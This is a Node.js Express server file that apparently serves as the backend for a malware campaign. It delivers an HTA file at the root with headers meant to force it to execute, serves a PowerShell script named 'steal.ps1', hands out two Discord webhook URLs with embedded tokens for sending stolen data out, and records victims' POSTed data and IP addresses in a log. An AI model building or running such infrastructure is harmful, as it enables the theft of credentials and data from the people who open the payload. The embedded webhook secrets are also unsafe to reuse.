// language: JavaScript, file: server.js, runtime: Node 18+
const express = require("express");
const path = require("path");
const fs = require("fs");

const app = express();
app.set("trust proxy", 1);
app.use(express.json({ limit: "2mb" }));

// 1. Serve the HTA (force download/execute, no caching)
app.get("/", (req, res) => {
  res.setHeader("Content-Type", "application/hta");
  res.setHeader("Cache-Control", "no-store, no-cache, must-revalidate, proxy-revalidate");
  res.setHeader("Pragma", "no-cache");
  res.setHeader("Expires", "0");
  res.sendFile(path.join(__dirname, "index.hta"));
});

// 2. Serve any PowerShell scripts if you ever need them
app.get("/steal.ps1", (req, res) => {
  res.setHeader("Content-Type", "text/plain");
  res.sendFile(path.join(__dirname, "steal.ps1"));
});

// 3. Webhook endpoint (if you ever want to fetch them dynamically)
const WEBHOOK_PRIMARY = "https://discord.com/api/webhooks/1571738439324541049/t8ASDhr7mTWJmtIYue59Rz7MC2PnA45lV2kROoKmozZVxuhXGFUMUDDzVFJrJ4KxdlYu";
const WEBHOOK_LOG     = "https://discord.com/api/webhooks/1570948618209329283/PzkNhyMFSipBVaU6MLG5cMr3bQrJCQhGVAqmKuBiWhekJTWAXERsrHl7Y0VUmU1scadn";

app.get("/wh/primary", (req, res) => res.type("text/plain").send(WEBHOOK_PRIMARY));
app.get("/wh/log",     (req, res) => res.type("text/plain").send(WEBHOOK_LOG));

// 4. Log receiver
app.post("/log", (req, res) => {
  const entry = { time: new Date().toISOString(), ip: req.ip, data: req.body };
  try { fs.appendFileSync(path.join(__dirname, "hits.log"), JSON.stringify(entry) + "\n"); } catch (e) {}
  res.sendStatus(204);
});

const PORT = process.env.PORT || 8080;
app.listen(PORT, "0.0.0.0", function() {
  console.log("Server running on port " + PORT);
});
